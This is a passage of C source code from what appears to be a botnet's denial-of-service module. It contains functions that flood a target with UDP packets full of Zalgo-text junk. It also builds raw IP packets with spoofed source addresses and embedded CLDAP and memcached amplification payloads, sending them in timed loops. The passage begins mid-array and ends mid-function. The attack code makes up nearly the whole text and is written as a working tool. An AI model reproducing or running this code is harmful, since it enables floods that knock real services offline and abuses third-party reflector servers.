2/x332/x35a/x32e/x31c/x331/x328/x324/x31f/x326/x31c/x331/x66/x337/x35b/x319/x34d/x320/x65/x337/x360/x35b/x33e/x30a/x30e/x342/x30e/x31e/x353/x322/x359/x32b/x33b/x34e/x31c/x355/x349/x33a/x32b/x31c/x32e/x35c/x6c/x335/x351/x35d/x302/x309/x343/x301/x351/x344/x310/x313/x303/x306/x303/x353/x353/x327/x332/x339/x32f/x33a/x327/x66/x335/x358/x314/x35d/x346/x332/x317/x355/x35a/x321/x33c/x330/x324/x33c/x32b/x71/x336/x314/x314/x310/x341/x30e/x35b/x343/x300/x357/x35d/x35d/x32f/x354/x349/x354/x356/x35c/x353/x359/x332/x32b/x31c/x77/x337/x302/x35b/x352/x31b/x30c/x30a/x307/x35d/x313/x344/x30c/x358/x30d/x315/x359/x353/x31f/x69/x336/x35b/x351/x30c/x34c/x35d/x315/x35d/x305/x309/x300/x344/x31a/x352/x300/x33e/x327/x348/x32f/x332/x323/x68/x336/x344/x31a/x30f/x358/x350/x30f/x35d/x342/x323/x317/x354/x31f/x31d/x333/x339/x331/x348/x326/x66/x335/x344/x310/x341/x304/x34c/x301/x312/x342/x35b/x300/x34b/x344/x313/x341/x32d/x328/x33c/x32b/x31f/x353/x73/x338/x31b/x344/x352/x33f/x340/x30e/x34a/x342/x340/x34c/x348/x322/x317/x34d/x324/x32b/x339/x6c/x337/x360/x327/x332/x347/x34d/x34d/x347/x356/x34d/x33b/x33b/x354/x32f/x31d/x35a/x6b/x337/x311/x33a/x31f/x323/x33c/x330/x349/x345/x333/x33b/x316/x322/x332/x325/x61/x337/x344/x358/x328/x333/x330/x317/x68/x335/x341/x303/x321/x31f/x332/x34e/x354/x356/x318/x325/x355/x66/x335/x301/x30a/x33d/x311/x35d/x312/x30f/x346/x34e/x339/x32b/x354/x349/x348/x34d/x66/x335/x31b/x33f/x312/x339/x31f/x33b/x35c/x339/x327/x34e/x61/x338/x33e/x30c/x30d/x35d/x342/x34c/x358/x34a/x351/x358/x33f/x32e/x66/x335/x342/x360/x33d/x305/x31b/x309/x31a/x350/x31a/x351/x341/x30f/x316/x359/x64/x334/x341/x311/x31a/x307/x35d/x35d/x35d/x300/x30f/x315/x348/x317/x323/x34e/x347/x355/x32f/x2c/x338/x313/x311/x30f/x351/x33e/x306/x34c/x313/x313/x309/x34c/x340/x321/x356/x34d/x35c/x31c/x349/x348/x31d/x354/x73/x336/x306/x304/x33e/x34c/x357/x306/x344/x35a/x339/x31c/x327/x349/x31d/x322/x325/x353/x329/x319/x318/x323/x35a/x73/x336/x307/x343/x312/x30c/x310/x312/x310/x327/x31f/x324/x31e/x31e/x31e/x33c/x35c/x6b/x335/x312/x33f/x305/x30d/x30a/x316/x64/x334/x344/x344/x305/x313/x346/x30b/x303/x346/x32e/x333/x321/x33a/x353/x31f/x354/x320/x34e/x73/x334/x30f/x357/x34a/x304/x342/x35d/x314/x312/x344/x358/x327/x329/x320/x354/x32f/x35c/x32f/x61/x334/x315/x312/x313/x352/x352/x341/x35d/x35d/x35a/x319/x326/x33c/x33c/x322/x67/x337/x314/x344/x313/x352/x306/x33f/x360/x35d/x340/x303/x34e/x317/x66/x338/x314/x340/x350/x346/x351/x33d/x31a/x313/x30b/x303/x314/x341/x324/x33c/x31d/x349/x324/x327/x35c/x35c/x348/x318/x355/x355/x33c/x317/x348/x65/x336/x350/x300/x304/x32a/x353/x323/x33c/x328/x326/x32e/x32b/x31f/x31d/x32b/x6c/x337/x30f/x30f/x350/x360/x31a/x344/x330/x359/x323/x35c/x33a/x32a/x324/x31e/x325/x330/x333/x32d/x353/x66/x335/x35d/x35b/x30c/x35d/x30b/x312/x344/x320/x321/x354/x71/x334/x313/x34c/x35b/x34b/x352/x34b/x30f/x332/x355/x332/x32e/x77/x336/x305/x350/x34b/x31b/x309/x302/x33f/x34b/x308/x356/x327/x326/x32a/x34d/x328/x328/x354/x345/x35a/x33b/x69/x338/x305/x309/x302/x341/x34c/x302/x302/x342/x346/x31b/x30f/x313/x32c/x35a/x322/x31f/x319/x353/x31d/x347/x324/x68/x338/x34b/x327/x323/x34e/x66/x338/x30e/x344/x340/x33d/x30b/x30d/x309/x340/x305/x315/x331/x32c/x31e/x318/x32e/x332/x347/x32a/x316/x317/x324/x32c/x347/x35c/x73/x336/x33e/x340/x311/x303/x34c/x360/x321/x6c/x334/x30a/x360/x31a/x358/x315/x305/x351/x313/x344/x305/x33b/x31e/x31d/x325/x320/x354/x321/x33a/x324/x339/x32b/x333/x35a/x6b/x336/x341/x307/x306/x30d/x313/x302/x30b/x302/x312/x340/x33c/x347/x330/x331/x324/x354/x329/x31c/x319/x32d/x61/x334/x360/x312/x354/x349/x33b/x339/x35c/x318/x32c/x32c/x32d/x33b/x68/x337/x302/x301/x30c/x30d/x34a/x34b/x342/x312/x307/x30b/x316/x339/x31f/x349/x356/x32b/x339/x356/x349/x332/x321/x317/x34d/x66/x335/x344/x33e/x312/x346/x34b/x33d/x31b/x311/x314/x30f/x344/x358/x359/x353/x327/x326/x33c/x332/x66/x335/x344/x31a/x306/x359/x35a/x35a/x61/x338/x309/x33f/x343/x344/x346/x34c/x34c/x30e/x35d/x343/x360/x358/x307/x35d/x32b/x327/x348/x339/x31d/x31e/x348/x359/x322/x66/x335/x358/x30f/x30b/x340/x35b/x342/x341/x305/x324/x353/x64/x335/x35d/x34b/x34d/x32d/x345/x323/x333/x32c/x354/x333/x33c/x345/x348/x35c/x331/x331/x32e/x2c/x336/x303/x305/x346/x304/x342/x309/x352/x346/x303/x351/x346/x343/x350/x32f/x31e/x320/x32a/x345/x33b/x345/x316/x73/x338/x360/x340/x357/x358/x35d/x360/x344/x346/x307/x307/x341/x35b/x352/x342/x32a/x320/x32d/x33c/x31e/x354/x359/x324/x319/x355/x339/x73/x335/x33f/x313/x33d/x324/x328/x34e/x353/x31c/x6b/x335/x351/x357/x305/x307/x30f/x30e/x307/x309/x314/x30e/x30f/x344/x341/x30f/x33e/x319/x316/x35c/x32d/x329/x31c/x330/x64/x336/x304/x30c/x34b/x34c/x33e/x35d/x326/x330/x320/x354/x32a/x353/x32b/x332/x73/x335/x344/x34a/x306/x309/x34c/x340/x350/x306/x34b/x350/x30e/x360/x30d/x309/x340/x355/x31f/x327/x32e/x319/x347/x31e/x319/x333/x317/x31e/x332/x61/x334/x343/x348/x67/x337/x304/x350/x30b/x340/x306/x34a/x304/x35b/x305/x30d/x34a/x33e/x30e/x30b/x304/x32f/x32e/x355/x329/x66/x334/x34a/x34c/x34d/x348/x325/x65/x338/x30c/x34c/x351/x352/x358/x327/x31e/x331/x33c/x32a/x324/x332/x329/x331/x332/x33a/x320/x332/x327/x328/x6c/x336/x341/x358/x301/x344/x30a/x352/x34a/x344/x35c/x330/x328/x355/x34e/x359/x32f/x32a/x32e/x33b/x32d/x66/x336/x310/x312/x309/x351/x325/x331/x359/x339/x317/x331/x71/x335/x358/x314/x341/x343/x311/x312/x308/x312/x330/x353/x33a/x330/x35c/x31c/x32c/x316/x32b/x328/x32e/x35a/x356/x330/x77/x335/x33d/x346/x346/x315/x301/x310/x33e/x355/x322/x318/x322/x347/x330/x354/x348/x353/x324/x316/x69/x337/x342/x342/x31a/x323/x32f/x325/x345/x31f/x327/x68/x336/x340/x311/x301/x305/x306/x33d/x33e/x358/x31b/x35d/x343/x315/x31e/x31f/x348/x345/x31f/x31e/x359/x66/x334/x30e/x34a/x340/x35d/x302/x31b/x33d/x31b/x345/x329/x31f/x32c/x34e/x31f/x32f/x73/x334/x340/x33f/x33e/x302/x32d/x345/x318/x34e/x321/x328/x35a/x32a/x34e/x35a/x32c/x329/x316/x331/x6c/x337/x30b/x35b/x34b/x34a/x314/x30d/x33e/x351/x358/x30c/x34b/x30e/x319/x319/x316/x330/x348/x348/x6b/x334/x357/x32a/x61/x336/x300/x346/x35b/x358/x34b/x324/x327/x32e/x34d/x330/x326/x328/x32c/x35c/x349/x31e/x31c/x333/x328/x347/x68/x336/x342/x35b/x344/x30a/x341/x341/x300/x30d/x30a/x30d/x30f/x313/x31e/x35a/x339/x32d/x320/x356/x32e/x32d/x353/x32c/x66/x338/x303/x35d/x34b/x360/x35b/x34c/x341/x30c/x344/x30a/x321/x32a/x33b/x32e/x35a/x66/x334/x33e/x34a/x35b/x360/x348/x359/x33a/x348/x347/x356/x31e/x32b/x61/x338/x341/x357/x346/x314/x341/x310/x351/x312/x305/x31b/x304/x312/x309/x351/x35b/x35c/x328/x328/x31c/x327/x66/x337/x303/x343/x358/x35d/x34e/x319/x320/x339/x34d/x345/x353/x31e/x328/x348/x31c/x64/x334/x306/x34c/x343/x34b/x310/x306/x301/x35d/x35d/x357/x358/x35b/x32a/x33c/x318/x332/x33b/x331/x34d/x32a/x356/x328/x359/x331/x2c/x334/x35d/x342/x301/x31b/x33b/x73/x338/x30b/x350/x35d/x30e/x351/x312/x33d/x307/x358/x313/x35d/x30f/x33f/x311/x351/x31c/x333/x323/x348/x317/x327/x33b/x32b/x319/x73/x334/x311/x30a/x331/x322/x32f/x6b/x334/x311/x304/x301/x352/x34b/x315/x30e/x304/x344/x33e/x30e/x303/x344/x305/x357/x332/x319/x32d/x33a/x359/x33c/x324/x353/x330/x347/x35c/x332/x332/x329/x64/x337/x340/x34c/x344/x342/x311/x34b/x33f/x308/x34c/x310/x34b/x327/x332/x321/x73/x338/x352/x350/x34c/x33d/x35d/x357/x313/x360/x35c/x319/x324/x33c/x32f/x318/x31d/x332/x61/x337/x302/x309/x34b/x30b/x306/x360/x305/x343/x306/x34c/x304/x30f/x30f/x346/x33a/x31e/x32b/x356/x34d/x326/x31d/x33a/x349/x33a/x327/x67/x336/x304/x34b/x344/x320/x31e/x353/x339/x66/x338/x33d/x309/x33e/x301/x33d/x30c/x318/x33a/x345/x318/x333/x35a/x318/x316/x33c/x31e/x31c/x65/x335/x33e/x34a/x314/x357/x360/x34c/x35d/x306/x34a/x340/x305/x340/x315/x324/x32c/x353/x6c/x336/x340/x30e/x31a/x306/x305/x35d/x307/x30a/x30b/x34c/x346/x341/x309/x344/x35d/x325/x34e/x66/x334/x30c/x302/x31a/x30f/x359/x32a/x328/x32b/x347/x329/x321/x33a/x356/x328/x331/x71/x335/x350/x305/x352/x300/x30d/x30c/x33d/x346/x34b/x30f/x30e/x314/x303/x327/x320/x319/x329/x32a/x347/x323/x31f/x347/x323/x31d/x329/x77/x336/x35d/x310/x344/x314/x35a/x326/x32f/x349/x322/x349/x35c/x325/x330/x356/x31d/x35a/x345/x320/x317/x69/x335/x360/x344/x351/x309/x34b/x349/x32a/x327/x32a/x326/x32e/x32b/x35a/x339/x32b/x317/x349/x317/x68/x335/x30c/x350/x344/x357/x310/x342/x309/x344/x30c/x309/x32c/x66/x337/x308/x30f/x34b/x302/x30c/x309/x351/x30b/x344/x30a/x310/x358/x325/x327/x319/x34d/x32f/x332/x320/x34e/x31f/x31e/x355/x327/x31f/x32c/x73/x336/x310/x344/x304/x341/x344/x317/x353/x6c/x338/x343/x315/x33d/x333/x319/x34d/x31e/x31c/x321/x330/x33a/x330/x34e/x317/x318/x345/x6b/x338/x307/x303/x345/x31f/x31f/x61/x337/x30e/x30e/x30e/x358/x351/x309/x30d/x35d/x352/x30e/x34b/x30b/x310/x304/x316/x329/x31c/x35a/x321/x32a/x323/x354/x321/x348/x32e/x68/x338/x33e/x314/x312/x307/x300/x341/x33e/x30d/x344/x350/x311/x301/x34c/x302/x32e/x355/x333/x356/x31d/x319/x325/x66/x337/x344/x30c/x33f/x30d/x300/x342/x34c/x351/x311/x344/x31a/x350/x313/x35c/x317/x355/x33a/x359/x327/x66/x335/x344/x34b/x35d/x30c/x33e/x34a/x31a/x322/x333/x33c/x325/x61/x338/x304/x31a/x34c/x329/x324/x33c/x353/x329/x329/x32f/x332/x318/x32e/x33b/x331/x66/x334/x30b/x309/x351/x312/x30e/x314/x30a/x35d/x35d/x346/x301/x301/x351/x30f/x358/x329/x33a/x318/x332/x320/x359/x349/x348/x324/x324/x64/x337/x305/x309/x308/x312/x306/x315/x34a/x314/x309/x35d/x311/x332/x339/x31d/x321/x318/x319/x330/x34e/x318/x31d/x2c/x334/x30b/x310/x344/x30d/x324/x331/x349/x348/x33c/x31f/x73/x334/x340/x341/x343/x340/x300/x30d/x304/x344/x352/x31e/x359/x73/x337/x304/x30d/x33c/x355/x31d/x316/x347/x34d/x326/x347/x353/x321/x35a/x353/x6b/x337/x30e/x30e/x35d/x342/x310/x301/x308/x302/x352/x341/x30f/x32f/x32d/x333/x330/x330/x347/x35a/x339/x318/x33a/x33a/x316/x64/x336/x344/x302/x310/x340/x352/x349/x31f/x339/x325/x339/x316/x356/x359/x321/x329/x356/x73/x338/x304/x311/x31b/x33e/x332/x34e/x31d/x355/x31f/x31e/x328/x326/x316/x355/x61/x336/x33d/x33e/x30d",
            "/x334/x30f/x33e/x308/x341/x351/x309/x309/x309/x304/x31b/x31a/x35c/x34e/x32e/x354/x330/x332/x31f/x320/x339/x31d/x66/x335/x305/x31e/x345/x331/x331/x320/x347/x330/x323/x347/x31c/x317/x31d/x331/x319/x73/x338/x35b/x31a/x31b/x360/x35b/x33e/x352/x306/x302/x350/x30b/x352/x344/x323/x349/x31d/x356/x320/x31c/x328/x353/x333/x323/x332/x6c/x334/x303/x300/x301/x341/x344/x310/x34b/x30d/x324/x6b/x335/x35d/x357/x31b/x35d/x302/x351/x319/x34d/x326/x345/x32d/x330/x32e/x320/x328/x324/x339/x333/x61/x335/x34c/x32a/x331/x359/x31d/x35a/x35a/x318/x33c/x325/x333/x332/x328/x33b/x31f/x68/x334/x358/x308/x303/x31b/x31b/x341/x35b/x344/x33a/x66/x335/x341/x310/x35d/x313/x32a/x331/x330/x326/x66/x334/x304/x350/x30f/x33d/x308/x300/x340/x312/x305/x33e/x33f/x314/x342/x332/x330/x324/x354/x323/x329/x323/x31c/x61/x334/x30a/x331/x325/x32c/x332/x316/x32b/x356/x355/x33c/x317/x32f/x32e/x66/x334/x34c/x313/x33f/x34e/x356/x355/x328/x323/x347/x35c/x64/x337/x311/x306/x301/x358/x307/x349/x325/x321/x2c/x336/x35b/x32d/x345/x319/x332/x332/x32c/x34d/x356/x325/x329/x33b/x73/x336/x352/x342/x33e/x342/x352/x343/x31d/x32b/x319/x32e/x318/x359/x33a/x327/x73/x337/x35d/x308/x34b/x346/x311/x306/x33e/x358/x30d/x30a/x308/x319/x32f/x327/x33a/x31e/x35a/x32f/x320/x333/x6b/x335/x35b/x31a/x315/x343/x300/x350/x34c/x303/x32a/x35a/x320/x359/x35c/x35a/x353/x317/x356/x319/x356/x32c/x32e/x64/x336/x344/x306/x300/x34c/x309/x30e/x350/x30c/x343/x350/x30f/x314/x30f/x34a/x30a/x345/x31f/x34d/x349/x31d/x32f/x339/x33a/x73/x337/x305/x310/x30d/x306/x312/x302/x300/x31a/x341/x34a/x319/x359/x328/x32b/x324/x355/x330/x61/x335/x306/x304/x343/x30d/x358/x30b/x303/x344/x30c/x31e/x67/x337/x30a/x351/x31a/x309/x315/x304/x35b/x330/x66/x335/x306/x341/x30a/x314/x308/x360/x360/x32e/x349/x349/x347/x331/x"
         
         };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendZalgoTwo(unsigned char *ip, int port, int secs){
    srand(time(0));
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
            "\\x336\\x352\\x311\\x314\\x33f\\x30f\\x346\\x33e\\x30e\\x30f\\x357\\x35d\\x35b\\x344\\x300\\x304\\x324\\x318\\x322\\x32b\\x317\\x328\\x32f\\x355\\x6c\\x338\\x31b\\x34a\\x307\\x355\\x348\\x333\\x318\\x359\\x31f\\x32c\\x356\\x355\\x359\\x66\\x337\\x31a\\x344\\x30b\\x358\\x301\\x326\\x71\\x334\\x34b\\x30f\\x30f\\x304\\x32d\\x316\\x33a\\x347\\x320\\x359\\x32a\\x35c\\x355\\x33b\\x31f\\x332\\x33b\\x77\\x336\\x306\\x344\\x312\\x342\\x313\\x353\\x355\\x31f\\x326\\x354\\x35a\\x69\\x337\\x302\\x350\\x31a\\x344\\x304\\x305\\x308\\x343\\x341\\x300\\x307\\x319\\x31f\\x33c\\x332\\x32b\\x348\\x329\\x34e\\x348\\x339\\x347\\x68\\x335\\x300\\x312\\x343\\x309\\x34a\\x35b\\x309\\x312\\x358\\x346\\x32f\\x354\\x329\\x31c\\x66\\x338\\x35b\\x353\\x348\\x319\\x316\\x322\\x328\\x33c\\x35c\\x332\\x73\\x335\\x310\\x308\\x331\\x320\\x31f\\x326\\x6c\\x336\\x34a\\x312\\x34b\\x360\\x30d\\x31c\\x33c\\x31d\\x349\\x322\\x359\\x32b\\x316\\x324\\x318\\x354\\x328\\x318\\x6b\\x337\\x31b\\x315\\x310\\x302\\x34c\\x305\\x343\\x30f\\x310\\x340\\x32a\\x316\\x31e\\x32e\\x320\\x319\\x325\\x31c\\x61\\x334\\x33e\\x331\\x333\\x353\\x33c\\x328\\x326\\x32b\\x68\\x336\\x33e\\x350\\x34b\\x342\\x32d\\x325\\x66\\x336\\x300\\x30a\\x30d\\x35d\\x344\\x31a\\x307\\x342\\x30f\\x300\\x34b\\x312\\x33e\\x306\\x352\\x32c\\x349\\x348\\x354\\x355\\x34e\\x32c\\x317\\x355\\x329\\x339\\x33c\\x66\\x334\\x315\\x34b\\x308\\x357\\x307\\x30e\\x342\\x342\\x342\\x30d\\x300\\x322\\x319\\x61\\x336\\x346\\x30a\\x33f\\x31c\\x332\\x323\\x321\\x32f\\x66\\x336\\x34c\\x309\\x303\\x346\\x303\\x33f\\x342\\x305\\x35b\\x358\\x343\\x311\\x313\\x308\\x32e\\x353\\x353\\x31d\\x316\\x345\\x64\\x337\\x30b\\x303\\x344\\x31a\\x352\\x30b\\x346\\x316\\x316\\x32c\\x347\\x318\\x356\\x322\\x332\\x31c\\x35c\\x322\\x326\\x2c\\x337\\x346\\x306\\x344\\x357\\x30a\\x341\\x314\\x344\\x31a\\x323\\x325\\x326\\x348\\x31c\\x332\\x73\\x335\\x344\\x310\\x303\\x302\\x314\\x315\\x35d\\x301\\x344\\x305\\x356\\x32c\\x32c\\x345\\x354\\x33b\\x32e\\x321\\x73\\x336\\x30e\\x30e\\x342\\x34b\\x34d\\x34d\\x32a\\x339\\x6b\\x337\\x31a\\x340\\x33e\\x307\\x304\\x31a\\x313\\x342\\x308\\x302\\x303\\x326\\x34e"
         };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void makecldappacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){ //AMP
    char *cldap_payload;
    int cldap_payload_len;
    cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", &cldap_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + cldap_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void cldapattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *cldap_payload;
    int cldap_payload_len;
    cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", &cldap_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makecldappacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + cldap_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + cldap_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + cldap_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makemempacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", &mem_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + mem_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void memattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", &mem_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
